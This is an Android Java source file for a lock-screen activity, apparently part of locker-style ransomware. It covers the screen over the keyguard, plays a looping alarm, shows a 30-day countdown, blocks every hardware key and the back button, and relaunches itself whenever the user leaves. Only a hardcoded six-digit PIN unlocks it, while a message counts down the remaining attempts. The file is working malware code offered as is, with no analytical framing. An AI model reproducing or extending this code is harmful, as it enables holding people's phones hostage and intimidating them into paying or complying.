package com.deep.alzz.ai;

import android.app.Activity;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.util.Timer;
import java.util.TimerTask;

public class LockActivity extends AppCompatActivity {

    private static final String CORRECT_PIN = "201192";
    private StringBuilder pin = new StringBuilder();
    private TextView[] pinBoxes = new TextView[6];
    private TextView statusText, timerText;
    private int attempts = 0;
    private long lockTime = System.currentTimeMillis();
    private Timer timer;
    private MediaPlayer mediaPlayer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Fullscreen flags — stay on top of everything
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        setContentView(R.layout.activity_lock);

        pinBoxes[0] = findViewById(R.id.pin1);
        pinBoxes[1] = findViewById(R.id.pin2);
        pinBoxes[2] = findViewById(R.id.pin3);
        pinBoxes[3] = findViewById(R.id.pin4);
        pinBoxes[4] = findViewById(R.id.pin5);
        pinBoxes[5] = findViewById(R.id.pin6);
        statusText = findViewById(R.id.status_text);
        timerText = findViewById(R.id.timer_text);

        playSound();
        startTimer();
        updatePinDisplay();
    }

    private void playSound() {
        try {
            // Play sound from assets if exists
            android.content.res.AssetFileDescriptor afd = getAssets().openFd("alarm.mp3");
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            mediaPlayer.setLooping(true);
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception e) {
            // No audio file — skip
        }
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    long elapsed = System.currentTimeMillis() - lockTime;
                    long remaining = 30L * 24 * 60 * 60 * 1000 - elapsed;
                    if (remaining <= 0) {
                        timerText.setText("TIME'S UP!");
                        return;
                    }
                    long days  = remaining / (24 * 60 * 60 * 1000);
                    long hours = (remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000);
                    long mins  = (remaining % (60 * 60 * 1000)) / (60 * 1000);
                    long secs  = (remaining % (60 * 1000)) / 1000;
                    timerText.setText(String.format("%d DAYS %02d:%02d:%02d", days, hours, mins, secs));
                });
            }
        }, 0, 1000);
    }

    private void updatePinDisplay() {
        for (int i = 0; i < 6; i++) {
            if (i < pin.length()) {
                pinBoxes[i].setText("●");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_filled);
            } else {
                pinBoxes[i].setText("");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_empty);
            }
        }
    }

    public void onDigitClick(View v) {
        if (pin.length() >= 6) return;
        pin.append(v.getTag().toString());
        updatePinDisplay();
        if (pin.length() == 6) checkPin();
    }

    public void onDeleteClick(View v) {
        if (pin.length() > 0) {
            pin.deleteCharAt(pin.length() - 1);
            updatePinDisplay();
        }
    }

    private void checkPin() {
        if (pin.toString().equals(CORRECT_PIN)) {
            if (timer != null) timer.cancel();
            if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
            stopService(new android.content.Intent(this, LockService.class));
            finish();
        } else {
            attempts++;
            int left = 3 - attempts;
            statusText.setText(left > 0 ? "WRONG! " + left + " ATTEMPTS LEFT" : "LOCKED!");
            pin.setLength(0);
            updatePinDisplay();
        }
    }

    // Block all hardware keys
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return true;
    }

    @Override
    public void onBackPressed() {}

    @Override
    protected void onPause() {
        super.onPause();
        // Re-launch self when user tries to leave
        Intent i = new Intent(this, LockActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (mediaPlayer != null) { try { mediaPlayer.release(); } catch (Exception e) {} }
    }
}
